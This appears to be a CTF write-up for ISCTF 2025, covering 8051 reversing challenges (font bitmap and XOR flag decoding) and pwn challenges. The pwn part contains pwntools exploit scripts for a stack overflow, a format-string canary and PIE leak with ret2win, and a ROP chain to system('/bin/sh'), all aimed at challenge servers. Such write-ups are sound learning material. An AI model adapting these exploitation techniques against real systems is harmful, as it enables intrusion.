+问题所在： 之前的脚本做了一个错误的假设，认为数据是“按列扫描”（Column-Major）并进行了矩阵转置（行列互换）。但根据你提供的 ucDataBlock 仔细分析，这实际上是标准字模（Row-Major）：每一个字节代表一行像素，而不是一列。
+如果用“按行”的方式直接打印，0x7E（二进制 01111110）在 _ 字符中就正好是一条底部的横线（下划线），而 A、5、1 等字符也会完全正向显示。
+这是修正后的脚本，它将直接按行渲染，你会清晰地看到 Wow_You_Are_Good_At_51，且没有旋转或乱码。
+修正版 Python 脚本 (Row-Major)
+import re# 原始数据c_code_data = &quot;&quot;&quot;0x70, 0x84, 0x00, 0xFF, 0x58, 0x41, 0x35, 0x31, 0x20, 0x22, 0x4D, 0x41,0x49, 0x4E, 0x2E, 0x61, 0x35, 0x31, 0x22, 0x20, 0x53, 0x45, 0x54, 0x28,0x53, 0x4D, 0x41, 0x4C, 0x4C, 0x29, 0x20, 0x44, 0x45, 0x42, 0x55, 0x47,0x20, 0x50, 0x52, 0x49, 0x4E, 0x54, 0x28, 0x2E, 0x5C, 0x4C, 0x69, 0x73,0x74, 0x69, 0x6E, 0x67, 0x73, 0x5C, 0x4D, 0x41, 0x49, 0x4E, 0x2E, 0x6C,0x73, 0x74, 0x29, 0x20, 0x4F, 0x42, 0x4A, 0x45, 0x43, 0x54, 0x28, 0x2E,0x5C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x73, 0x5C, 0x4D, 0x41, 0x49,0x4E, 0x2E, 0x6F, 0x62, 0x6A, 0x29, 0x20, 0x45, 0x50, 0x00, 0x00, 0x09,0xD0, 0xF5, 0x68, 0x12, 0x2E, 0x5C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74,0x73, 0x5C, 0x4D, 0x41, 0x49, 0x4E, 0x2E, 0x6F, 0x62, 0x6A, 0x01, 0x00,0xE5, 0xCF, 0xF5, 0x68, 0x09, 0x4D, 0x41, 0x49, 0x4E, 0x2E, 0x61, 0x35,0x31, 0x00, 0x86, 0x70, 0x69, 0x00, 0xFF, 0x1B, 0x42, 0x4C, 0x35, 0x31,0x20, 0x40, 0x2E, 0x5C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x73, 0x5C,0x65, 0x7A, 0x6D, 0x63, 0x75, 0x32, 0x2E, 0x6C, 0x6E, 0x70, 0x20, 0x00,0x00, 0xE5, 0xCF, 0xF5, 0x68, 0x10, 0x2E, 0x5C, 0x4F, 0x62, 0x6A, 0x65,0x63, 0x74, 0x73, 0x5C, 0x65, 0x7A, 0x6D, 0x63, 0x75, 0x32, 0x03, 0x00,0xDE, 0x0E, 0xF5, 0x68, 0x14, 0x2E, 0x5C, 0x4F, 0x62, 0x6A, 0x65, 0x63,0x74, 0x73, 0x5C, 0x65, 0x7A, 0x6D, 0x63, 0x75, 0x32, 0x2E, 0x6C, 0x6E,0x70, 0x04, 0x00, 0xE5, 0xCF, 0xF5, 0x68, 0x12, 0x2E, 0x5C, 0x4F, 0x62,0x6A, 0x65, 0x63, 0x74, 0x73, 0x5C, 0x4D, 0x41, 0x49, 0x4E, 0x2E, 0x6F,0x62, 0x6A, 0xB1, 0x02, 0x08, 0x00, 0x04, 0x4D, 0x41, 0x49, 0x4E, 0xFF,0x00, 0xCE, 0x10, 0x07, 0x00, 0x00, 0x04, 0x4D, 0x41, 0x49, 0x4E, 0xC0,0x24, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x08, 0x4D, 0x41, 0x49, 0x4E, 0x2E,0x61, 0x35, 0x31, 0xAD, 0x22, 0x89, 0x01, 0x00, 0x00, 0x00, 0x48, 0x02,0x00, 0x05, 0x43, 0x48, 0x52, 0x31, 0x30, 0x00, 0x00, 0x50, 0x02, 0x00,0x05, 0x43, 0x48, 0x52, 0x31, 0x31, 0x00, 0x00, 0x58, 0x02, 0x00, 0x05,0x43, 0x48, 0x52, 0x31, 0x32, 0x00, 0x00, 0x60, 0x02, 0x00, 0x05, 0x43,0x48, 0x52, 0x31, 0x33, 0x00, 0x00, 0x68, 0x02, 0x00, 0x05, 0x43, 0x48,0x52, 0x31, 0x34, 0x00, 0x00, 0x70, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52,0x31, 0x35, 0x00, 0x00, 0x78, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52, 0x31,0x36, 0x00, 0x00, 0x80, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52, 0x31, 0x37,0x00, 0x00, 0x88, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52, 0x31, 0x38, 0x00,0x00, 0x90, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52, 0x31, 0x39, 0x00, 0x00,0x08, 0x02, 0x00, 0x04, 0x43, 0x48, 0x52, 0x32, 0x00, 0x00, 0x98, 0x02,0x00, 0x05, 0x43, 0x48, 0x52, 0x32, 0x30, 0x00, 0x00, 0xA0, 0x02, 0x00,0x05, 0x43, 0x48, 0x52, 0x32, 0x31, 0x00, 0x00, 0xA8, 0x02, 0x00, 0x05,0x43, 0x48, 0x52, 0x32, 0x32, 0x00, 0x00, 0xB0, 0x02, 0x00, 0x05, 0x43,0x48, 0x52, 0x32, 0x33, 0x00, 0x00, 0xB8, 0x02, 0x00, 0x05, 0x43, 0x48,0x52, 0x32, 0x34, 0x00, 0x00, 0xC0, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52,0x32, 0x35, 0x00, 0x00, 0xC8, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52, 0x32,0x36, 0x00, 0x00, 0xD0, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52, 0x32, 0x37,0x00, 0x00, 0xD8, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52, 0x32, 0x38, 0x00,0x00, 0xE0, 0x02, 0x00, 0x05, 0x43, 0x48, 0x52, 0x32, 0x39, 0x00, 0x00,0x10, 0x02, 0x00, 0x04, 0x43, 0x48, 0x52, 0x33, 0x00, 0x00, 0xE8, 0x02,0x00, 0x05, 0x43, 0x48, 0x52, 0x33, 0x30, 0x00, 0x00, 0x18, 0x02, 0x00,0x04, 0x43, 0x48, 0x52, 0x34, 0x00, 0x00, 0x20, 0x02, 0x00, 0x04, 0x43,0x48, 0x52, 0x35, 0x00, 0x00, 0x28, 0x02, 0x00, 0x04, 0x43, 0x48, 0x52,0x36, 0x00, 0x00, 0x30, 0x02, 0x00, 0x04, 0x43, 0x48, 0x52, 0x37, 0x00,0x00, 0x38, 0x02, 0x00, 0x04, 0x43, 0x48, 0x52, 0x38, 0x00, 0x00, 0x40,0x02, 0x00, 0x04, 0x43, 0x48, 0x52, 0x39, 0x00, 0x00, 0x1C, 0x01, 0x00,0x0A, 0x44, 0x45, 0x4C, 0x41, 0x59, 0x31, 0x30, 0x30, 0x4D, 0x53, 0x00,0x00, 0xF0, 0x02, 0x00, 0x07, 0x45, 0x4E, 0x44, 0x46, 0x4C, 0x41, 0x47,0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x49, 0x4E, 0x49, 0x54, 0x00, 0x00,0x09, 0x01, 0x00, 0x09, 0x4D, 0x41, 0x49, 0x4E, 0x5F, 0x4C, 0x4F, 0x4F,0x50, 0x00, 0x00, 0x2E, 0x01, 0x00, 0x04, 0x4E, 0x45, 0x58, 0x54, 0x00,0x02, 0x80, 0x00, 0x00, 0x02, 0x50, 0x30, 0x00, 0x02, 0xA0, 0x00, 0x00,0x02, 0x50, 0x32, 0x92, 0x06, 0x06, 0x00, 0x00, 0x00, 0x00, 0x21, 0x00,0xD3, 0x22, 0x07, 0x00, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0xD2, 0x06,0x42, 0x00, 0x00, 0x00, 0x01, 0x75, 0x80, 0xFF, 0x75, 0xA0, 0xFF, 0x90,0x02, 0x07, 0xE5, 0xA0, 0xF4, 0xF5, 0xA0, 0x74, 0x00, 0x31, 0x1C, 0xA3,0x93, 0xF4, 0xF5, 0x80, 0xB4, 0x00, 0xEF, 0x80, 0xE4, 0x00, 0x00, 0x00,0xC0, 0x30, 0xC0, 0x31, 0xC0, 0x32, 0x75, 0x30, 0x22, 0x75, 0x31, 0x9F,0x75, 0x32, 0x38, 0xD5, 0x32, 0xFD, 0xD5, 0x31, 0xFA, 0xD5, 0x30, 0xF7,0xD0, 0x32, 0xD0, 0x31, 0xD0, 0x30, 0x22, 0xBE, 0x22, 0x98, 0x00, 0x03,0x00, 0x00, 0x01, 0x05, 0x00, 0x00, 0x03, 0x01, 0x06, 0x00, 0x00, 0x06,0x01, 0x07, 0x00, 0x00, 0x09, 0x01, 0x09, 0x00, 0x00, 0x0B, 0x01, 0x0A,0x00, 0x00, 0x0C, 0x01, 0x0B, 0x00, 0x00, 0x0E, 0x01, 0x0C, 0x00, 0x00,0x10, 0x01, 0x0D, 0x00, 0x00, 0x12, 0x01, 0x0E, 0x00, 0x00, 0x13, 0x01,0x0F, 0x00, 0x00, 0x14, 0x01, 0x10, 0x00, 0x00, 0x15, 0x01, 0x11, 0x00,0x00, 0x17, 0x01, 0x12, 0x00, 0x00, 0x1A, 0x01, 0x13, 0x00, 0x00, 0x1C,0x01, 0x18, 0x00, 0x00, 0x1D, 0x01, 0x19, 0x00, 0x00, 0x1E, 0x01, 0x1A,0x00, 0x00, 0x1F, 0x01, 0x1B, 0x00, 0x00, 0x21, 0x01, 0x1C, 0x00, 0x00,0x23, 0x01, 0x1D, 0x00, 0x00, 0x25, 0x01, 0x1E, 0x00, 0x00, 0x28, 0x01,0x1F, 0x00, 0x00, 0x2B, 0x01, 0x20, 0x00, 0x00, 0x2E, 0x01, 0x22, 0x00,0x00, 0x31, 0x01, 0x23, 0x00, 0x00, 0x34, 0x01, 0x24, 0x00, 0x00, 0x37,0x01, 0x25, 0x00, 0x00, 0x39, 0x01, 0x26, 0x00, 0x00, 0x3B, 0x01, 0x27,0x00, 0x00, 0x3D, 0x01, 0x28, 0x00, 0x07, 0x06, 0x0C, 0x00, 0x00, 0x08,0x02, 0x3C, 0x18, 0x18, 0x18, 0x18, 0x18, 0x3C, 0x00, 0xF4, 0x06, 0x0C,0x00, 0x00, 0x10, 0x02, 0x3C, 0x42, 0x40, 0x3C, 0x02, 0x42, 0x3C, 0x00,0x62, 0x06, 0x0C, 0x00, 0x00, 0x18, 0x02, 0x3C, 0x42, 0x40, 0x40, 0x40,0x42, 0x3C, 0x00, 0x18, 0x06, 0x0C, 0x00, 0x00, 0x20, 0x02, 0x7E, 0x08,0x08, 0x08, 0x08, 0x08, 0x08, 0x00, 0x1E, 0x06, 0x0C, 0x00, 0x00, 0x28,0x02, 0x7E, 0x40, 0x40, 0x7C, 0x40, 0x40, 0x40, 0x00, 0x8A, 0x06, 0x0C,0x00, 0x00, 0x30, 0x02, 0x1E, 0x10, 0x10, 0x20, 0x10, 0x10, 0x1E, 0x00,0x20, 0x06, 0x0C, 0x00, 0x00, 0x38, 0x02, 0x42, 0x42, 0x42, 0x5A, 0x7E,0x66, 0x42, 0x00, 0x6E, 0x06, 0x0C, 0x00, 0x00, 0x40, 0x02, 0x00, 0x00,0x3C, 0x42, 0x42, 0x42, 0x3C, 0x00, 0x6E, 0x06, 0x0C, 0x00, 0x00, 0x48,0x02, 0x00, 0x00, 0x42, 0x42, 0x5A, 0x7E, 0x42, 0x00, 0x06, 0x06, 0x0C,0x00, 0x00, 0x50, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x00,0x1E, 0x06, 0x0C, 0x00, 0x00, 0x58, 0x02, 0x42, 0x42, 0x42, 0x3C, 0x18,0x18, 0x18, 0x00, 0x4A, 0x06, 0x0C, 0x00, 0x00, 0x60, 0x02, 0x00, 0x00,0x3C, 0x42, 0x42, 0x42, 0x3C, 0x00, 0x4E, 0x06, 0x0C, 0x00, 0x00, 0x68,0x02, 0x00, 0x00, 0x42, 0x42, 0x42, 0x42, 0x3E, 0x00, 0x3E, 0x06, 0x0C,0x00, 0x00, 0x70, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x00,0xFE, 0x06, 0x0C, 0x00, 0x00, 0x78, 0x02, 0x18, 0x24, 0x42, 0x42, 0x7E,0x42, 0x42, 0x00, 0xB2, 0x06, 0x0C, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00,0x5C, 0x62, 0x40, 0x40, 0x40, 0x00, 0xEE, 0x06, 0x0C, 0x00, 0x00, 0x88,0x02, 0x00, 0x00, 0x3C, 0x42, 0x7E, 0x40, 0x3C, 0x00, 0xEC, 0x06, 0x0C,0x00, 0x00, 0x90, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x00,0xDE, 0x06, 0x0C, 0x00, 0x00, 0x98, 0x02, 0x3C, 0x42, 0x40, 0x4E, 0x42,0x42, 0x3E, 0x00, 0x86, 0x06, 0x0C, 0x00, 0x00, 0xA0, 0x02, 0x00, 0x00,0x3C, 0x42, 0x42, 0x42, 0x3C, 0x00, 0x0E, 0x06, 0x0C, 0x00, 0x00, 0xA8,0x02, 0x00, 0x00, 0x3C, 0x42, 0x42, 0x42, 0x3C, 0x00, 0x06, 0x06, 0x0C,0x00, 0x00, 0xB0, 0x02, 0x02, 0x02, 0x32, 0x4A, 0x4A, 0x4A, 0x3E, 0x00,0xEA, 0x06, 0x0C, 0x00, 0x00, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x7E, 0x00, 0xB6, 0x06, 0x0C, 0x00, 0x00, 0xC0, 0x02, 0x18, 0x24,0x42, 0x42, 0x7E, 0x42, 0x42, 0x00, 0x6A, 0x06, 0x0C, 0x00, 0x00, 0xC8,0x02, 0x10, 0x10, 0x7E, 0x10, 0x10, 0x10, 0x0E, 0x00, 0x48, 0x06, 0x0C,0x00, 0x00, 0xD0, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x00,0x9E, 0x06, 0x0C, 0x00, 0x00, 0xD8, 0x02, 0x3E, 0x20, 0x20, 0x3C, 0x02,0x02, 0x3C, 0x00, 0x1A, 0x06, 0x0C, 0x00, 0x00, 0xE0, 0x02, 0x10, 0x30,0x10, 0x10, 0x10, 0x10, 0x38, 0x00, 0x54, 0x06, 0x0C, 0x00, 0x00, 0xE8,0x02, 0x78, 0x08, 0x08, 0x0C, 0x08, 0x08, 0x78, 0x00, 0xE8, 0x06, 0x05,0x00, 0x00, 0xF0, 0x02, 0xFF, 0x04, 0x10, 0x07, 0x00, 0x03, 0x04, 0x4D,0x41, 0x49, 0x4E, 0xBD, 0x04, 0x0A, 0x00, 0x04, 0x4D, 0x41, 0x49, 0x4E,0x00, 0x00, 0x01, 0x00, 0xC8&quot;&quot;&quot;# 数据提取data = [int(x, 16) for x in re.findall(r&#x27;0x([0-9A-Fa-f]+)&#x27;, c_code_data)]font_chars = []i = 0while i &lt; len(data) - 10:    if data[i] == 0x02:        # 提取接下来的 8 个字节        font_chars.append(data[i+1 : i+9])        i += 9    else:        i += 1def print_row_major(chars):    print(&quot;Decoding Result:\n&quot;)    # 我们不进行转置，而是直接将每个 Byte 视为一行        # 逐个处理字符    # 为了方便横向阅读，我们将所有字符的“第0行”拼在一起，然后是“第1行”...        lines = [&quot;&quot;] * 8        for char_bytes in chars:        # char_bytes 包含 8 个字节，对应 8 行        for row_idx, byte_val in enumerate(char_bytes):            # 将 byte 转为 8位二进制，替换为方块            # 注意：bin(byte) 出来是 0bXXXX，我们需要 zfill(8)            bits = bin(byte_val)[2:].zfill(8)            # 替换显示，0 为空格，1 为方块            visual_row = bits.replace(&#x27;0&#x27;, &#x27; &#x27;).replace(&#x27;1&#x27;, &#x27;█&#x27;)            lines[row_idx] += visual_row + &quot;  &quot; # 加间距                # 打印最终的 8 行    for line in lines:        print(line)print_row_major(font_chars)
+
+这个脚本显然不是最简便的，但是最后结果算是对了
+
+ISCTF{Wow_You_Are_Good_At_51}
+小蓝鲨的单片机_2这道题虽然看似复杂（涉及 1602A 屏幕驱动），但其实核心逻辑非常简单，甚至不需要去模拟屏幕的显示过程。
+这依然是一道查找关键算法的逆向题。
+
+核心线索分析你提供的 数据末尾有一段非常可疑的字节流（在 填充区和指令区之后）：ucDataBlock0xFF
+
+C
+&#x2F;&#x2F; 数据末尾的一串十六进制数EB, F1, E1, F6, E4, D9, F5, CD, D5, FD, FB, CD, D7, FD, E3, D0, C7, FD, 97, 93, FD, EF, C3, D1, D6, C7, D0, DF同时，请仔细观察这一行汇编机器码（位于数据倒数第5-6行左右）： … E8 64 A2 F8 22 …
+让我们把它翻译成 8051 汇编指令：
+E8 : (把寄存器 R0 的值放入累加器 A)MOV A, R0
+64 A2 : XRL A, #0xA2 (将 A 与 0xA2 进行异或运算)
+F8 : (把运算结果放回 R0)MOV R0, A
+22 : (子程序返回)RET
+结论： 这是一个极其明显的异或（XOR）加密。程序在显示字符前，会先用 这个 Key 对数据进行解密。0xA2
+
+解密演示我们不需要关心 1602A 怎么初始化，也不用管 口怎么输出。我们只需要把末尾那串可疑的数据拿出来，和 进行异或即可。P00xA2
+
+手动验证前几个字节：
+EB ^ A2 &#x3D; 49 -&gt; ASCII ‘I’
+F1 ^ A2 &#x3D; 53 -&gt; ASCII ‘S’
+E1 ^ A2 &#x3D; 43 -&gt; ASCII ‘C’
+F6 ^ A2 &#x3D; 54 -&gt; ASCII ‘T’
+E4 ^ A2 &#x3D; 46 -&gt; ASCII ‘F’
+D9 ^ A2 &#x3D; 7B -&gt; ASCII ‘{‘
+开头完美符合 Flag 格式！
+
+解题脚本 (Python)你可以直接运行这段代码来获取完整 Flag：
+
+Python
+题目中提取的加密字节流 (去掉了最后的 82 填充)
+encrypted_data = [    0xEB, 0xF1, 0xE1, 0xF6, 0xE4, 0xD9,     0xF5, 0xCD, 0xD5, 0xFD,     0xFB, 0xCD, 0xD7, 0xFD,     0xE3, 0xD0, 0xC7, 0xFD,     0x97, 0x93, 0xFD,     0xEF, 0xC3, 0xD1, 0xD6, 0xC7, 0xD0, 0xDF]核心 Key，在机器码 &quot;64 A2&quot; 中找到xor_key = 0xA2flag = &quot;&quot;for byte in encrypted_data:    flag += chr(byte ^ xor_key)print(&quot;Decoded Flag: &quot; + flag)
+
+最终答案运行脚本后，你会得到：
+
+ISCTF{Wow_You_Are_51_Master}
+总结这道题的考点在于**“特征码识别”**。在 8051 汇编中：
+64 是 (异或) 的操作码。XRL
+当你在一堆乱码数据旁边看到 时， 通常就是解密的 Key。64 XXXX
+这种题目通常不需要完全看懂驱动代码，直接找数据和简单的运算逻辑最快。
+
+PWN来签个到吧反汇编得到
+__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  int v4[38]; // [rsp+0h] [rbp-A8h] BYREF  unsigned __int64 v5; // [rsp+98h] [rbp-10h]  v5 = __readfsqword(0x28u);  memset(v4, 0, 0x88uLL);  v4[34] = 0;  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  puts(&quot;do you like blueshark?&quot;);  if ( read(0, v4, 0x3E8uLL) &lt;= 0 )  &#123;    puts(&quot;&quot;);  &#125;  else  &#123;    printf(&quot;data.arr[2] = 0x%x\n&quot;, (unsigned int)v4[27]);    if ( v4[27] == -1378178390 )    &#123;      puts(&quot;blueshark likes you too!&quot;);      system(&quot;/bin/sh&quot;);    &#125;    else    &#123;      puts(&quot;no love anymore...&quot;);    &#125;  &#125;  return 0LL;&#125;
+
+保护全开，但是我们只需要通过栈溢出覆盖局部变量即可，偏移量为27*4，
+from pwn import *context.log_level = &#x27;debug&#x27; context.arch = &#x27;amd64&#x27;#p = remote(&#x27;challenge.bluesharkinfo.com&#x27;, 20227) p = process(&#x27;./sign&#x27;) offset = 27 * 4 target_value = -1378178390# b&#x27;A&#x27; * 108  +  0xADD152AA (小端序)payload = flat([    b&#x27;A&#x27; * offset,    p32(target_value, sign=&#x27;signed&#x27;) ])p.recvuntil(&quot;do you like blueshark?&quot;)p.send(payload) p.interactive()
+
+ez_fmt保护全开
+查看字符串，明显有system bin&#x2F;sh这个后门函数
+unsigned __int64 win()&#123;  unsigned __int64 v1; // [rsp+8h] [rbp-8h]  v1 = __readfsqword(0x28u);  system(&quot;/bin/sh&quot;);  return v1 - __readfsqword(0x28u);&#125;
+
+
+重点看vuln函数，
+unsigned __int64 vuln()&#123;  char buf[136]; // [rsp+0h] [rbp-90h] BYREF  unsigned __int64 v2; // [rsp+88h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;Welcome to ISCTF!&quot;);  printf(&quot;1st input: &quot;);  read(0, buf, 0x100uLL);  printf(buf);  puts(&quot;\n[leak end]\n&quot;);  printf(&quot;2nd input: &quot;);  read(0, buf, 0x200uLL);  puts(&quot;Goodbye!&quot;);  return v2 - __readfsqword(0x28u);&#125;
+存在明显格式化字符串漏洞
+第一次输入aaaa 一堆%p，算出偏移为6，
+怎么泄露canary和PIE，我直接让AI总结一下，说的非常详细了
+from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;,terminal = [&#x27;tmux&#x27;, &#x27;split-window&#x27;, &#x27;-h&#x27;])#p = process(&#x27;./pwn&#x27;)p =remote(&quot;challenge.bluesharkinfo.com&quot;,29159)elf = ELF(&#x27;./pwn&#x27;)##gdb.attach(p,&#x27;b main&#x27;)# 1. 发送 Payload 泄露地址# 这里同时泄露 Canary (%23$p) 和 程序地址 (%25$p)p.recvuntil(b&#x27;1st input: &#x27;)p.sendline(b&#x27;%23$p,%25$p&#x27;)# 2. 接收并计算data = p.recvline().strip().split(b&#x27;,&#x27;)canary = int(data[0], 16)leak_addr = int(data[1], 16) # 这就是你看到的类似 0x60efa5b5035b 的值print(f&quot;[+] Leaked Canary: &#123;hex(canary)&#125;&quot;)print(f&quot;[+] Leaked Code Addr: &#123;hex(leak_addr)&#125;&quot;)# 3. 计算基址 (Base Address)# 【重要】把下面这个 0xXXXX 换成你在 GDB 里算出来的 offsetoffset = 0x135belf.address = leak_addr - offset print(f&quot;[+] PIE Base calculated: &#123;hex(elf.address)&#125;&quot;)print(f&quot;[+] Win Function Address: &#123;hex(elf.symbols[&#x27;win&#x27;])&#125;&quot;)# 4. 发送 Ret2Win Payloadp.recvuntil(b&#x27;2nd input: &#x27;)# 如果直接跳 win 报错，尝试 win+1 (跳过 push rbp)win_addr = elf.symbols[&#x27;win&#x27;]ret_addr = elf.address + 0x101apayload = flat([    b&#x27;a&#x27; * 136,         # Padding    canary,             # Canary    b&#x27;b&#x27; * 8,    ret_addr,           # Old RBP    win_addr      # Ret Address])p.sendline(payload)p.interactive()
+
+
+ret2ropint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s1[8]; // [rsp+6h] [rbp-Ah] BYREF  __int16 v5; // [rsp+Eh] [rbp-2h]  *(_QWORD *)s1 = 0LL;  v5 = 0;  init();  puts(&quot;if you want to watch demo&quot;);  __isoc99_scanf(&quot;%10s&quot;, s1);  getchar();  if ( !strcmp(s1, &quot;yes&quot;) )    demo();  puts(&quot;now solve this pratice&quot;);  vuln();  return 0;&#125;
+
+ssize_t vuln()&#123;  ssize_t result; // rax  char buf[32]; // [rsp+0h] [rbp-50h] BYREF  char v2[32]; // [rsp+20h] [rbp-30h] BYREF  __int64 v3; // [rsp+40h] [rbp-10h]  __int64 i; // [rsp+48h] [rbp-8h]  puts(&quot;please int your name&quot;);  read(0, &amp;name, 0x10uLL);  puts(&quot;please introduce yourself&quot;);  getRandom(v2, 32LL);  result = read(0, buf, 0x100uLL);  v3 = result;  if ( result &gt; 0 )  &#123;    for ( i = 0LL; ; ++i )    &#123;      result = i;      if ( i &gt;= v3 )        break;      buf[i] ^= v2[i];    &#125;  &#125;  return result;&#125;
+
+这个题给我们演示了基本的ROP链，非常经典的有system无bin&#x2F;sh，需要我们自己通过寄存器传参，bss段存在变量name，可读可写，我们可以第一次把bin&#x2F;sh写到变量name上
+但是ROPgadget查了一下程序内是没有pop rdi ret这个关键汇编的，但是题目里的demo演示了可以通过pop rax; ret add rax, 0x10; ret mov rbx, rax; ret三个ROP传参，
+我们照葫芦画瓢即可，查到程序里有pop_rsi_ret = 0x401a1c和mov_rdi_rsi_ret = 0x401a25，可以代替pop rdi传参
+要注意的是这个题是不需要ret栈对齐的，加了ret反而多此一举
+from pwn import *# 1. 设置context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;,terminal = [&#x27;tmux&#x27;, &#x27;split-window&#x27;, &#x27;-h&#x27;])#p = process(&#x27;./pwn&#x27;)# elf = ELF(&#x27;./pwn&#x27;)# 如果是远程，取消下面注释p = remote(&#x27;challenge.bluesharkinfo.com&#x27;,28153) # 请填入你的靶机IP和端口elf = ELF(&#x27;./pwn&#x27;)# 2. 关键地址pop_rsi_ret = 0x401a1cmov_rdi_rsi_ret = 0x401a25ret = 0x40101a # 手动指定 name 地址 (如果在本地打不通，请检查这个地址是否与 IDA 一致)# name_addr = 0x601080 name_addr = elf.sym[&#x27;name&#x27;]system_addr =elf.sym[&#x27;system&#x27;]#gdb.attach(p)# 3. 攻击p.sendlineafter(b&quot;demo&quot;, b&quot;no&quot;)# 写入 /bin/shp.sendafter(b&quot;name&quot;, b&quot;/bin/sh\x00&quot;)# 构造 ROP# 这里的 ret 不仅是为了对齐栈，更是为了利用它的数值使得 (i &gt; v3) 从而跳出死循环# 构造 Payloadpayload = b&#x27;A&#x27; * 88             # Padding 到返回地址# --- ROP Start ---payload += p64(pop_rsi_ret)     # 1. 弹出下面的数据payload += p64(0x100)           # 2. [关键] 这个值会让 v3 变 0，强制 Break 循环！# --- 循环已死，后面可以随便写 ---payload += p64(pop_rsi_ret)     # 3. 重新设置 RSIpayload += p64(name_addr)     # 4. 放入 /bin/sh 地址payload += p64(mov_rdi_rsi_ret) # 5. 转移到 RDI#payload += p64(ret)      # 6. 栈对齐 (System通常要求RSP+8对齐16字节)payload += p64(system_addr)     # 7. Get Shell# 补齐长度并发送# 必须保证发送长度足够长，确保 0x100 对应的位置有数据payload = payload.ljust(0x100, b&#x27;\x00&#x27;)p.sendafter(b&quot;yourself&quot;, payload)p.interactive()
+
+
+2048int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [rsp+Fh] [rbp-51h]  char dest[72]; // [rsp+10h] [rbp-50h] BYREF  unsigned __int64 v6; // [rsp+58h] [rbp-8h]  v6 = __readfsqword(0x28u);  score = 50;  init(argc, argv, envp);  printf(&quot;Welcome to ISCTF2025\ninput your name\n&gt;&quot;);  read(0, buf, 0x32uLL);  buf[strcspn(buf, &quot;\n&quot;)] = 0;  strcpy(dest, &quot;Hello,&quot;);  strcat(dest, buf);  strcpy(buf, dest);  printf(&quot;%s,I won&#x27;t give you the shell until you get 100,000 points,Press \&quot;Enter\&quot; to start the game&quot;, buf);  getchar();  while ( 1 )  &#123;    playgame();    printf(&quot;Enter \&quot;Q\&quot; to settle and exit. Enter any other characters to start a new round\n&gt;&quot;);    getchar();    v4 = getchar();    if ( v4 == 81 || v4 == 113 )      break;    getchar();  &#125;  final();  return 0;&#125;
+
+__int64 final()&#123;  puts(&quot;checking your score...&quot;);  sleep(1u);  printf(&quot;your score:%u\ntarget score:100000\n&quot;, (unsigned int)score);  sleep(1u);  if ( (unsigned int)score &lt;= 0x1869F )  &#123;    puts(&quot;Your score doesn&#x27;t meet the target,so you are not suitable for the flag yet...&quot;);  &#125;  else  &#123;    puts(&quot;here is your shell&quot;);    sleep(1u);    shell();  &#125;  sleep(1u);  return 0LL;&#125;
+
+__int64 shell()&#123;  int v1; // [rsp+Ch] [rbp-94h]  __int64 buf[18]; // [rsp+10h] [rbp-90h] BYREF  buf[17] = __readfsqword(0x28u);  getchar();  while ( 1 )  &#123;    while ( 1 )    &#123;      buf[0] = 0LL;      buf[1] = 0LL;      buf[2] = 0LL;      buf[3] = 0LL;      buf[4] = 0LL;      buf[5] = 0LL;      buf[6] = 0LL;      buf[7] = 0LL;      buf[8] = 0LL;      buf[9] = 0LL;      buf[10] = 0LL;      buf[11] = 0LL;      buf[12] = 0LL;      buf[13] = 0LL;      buf[14] = 0LL;      buf[15] = 0LL;      printf(&quot;$ &quot;);      v1 = read(0, buf, 0x128uLL);      if ( v1 &gt;= 0 )        break;      perror(&quot;read error&quot;);    &#125;    if ( v1 &gt; 0 &amp;&amp; *((_BYTE *)buf + v1 - 1) == 10 )      *((_BYTE *)buf + v1 - 1) = 0;    printf(&quot;executing command: &quot;);    puts((const char *)buf);    sleep(1u);    if ( !strcmp((const char *)buf, &quot;exit&quot;) )      break;    if ( !strcmp((const char *)buf, &quot;ls&quot;) )      system((const char *)buf);    else      printf(&quot;command not found: %s\n&quot;, (const char *)buf);  &#125;  return 0LL;&#125;
+
+一个2048小游戏，要我们玩到100000，考察的是整数溢出，AI用了-10，远远大于100000
+有system，无bin&#x2F;sh，依然需要传参，依然是bss段存在buf
+需要泄露canary
+这个题很好的点是由pop rdi的，方便我们传system的一参
+最后的shell貌似是个假shell，之前试了很多次，可以ls，但是不能cat
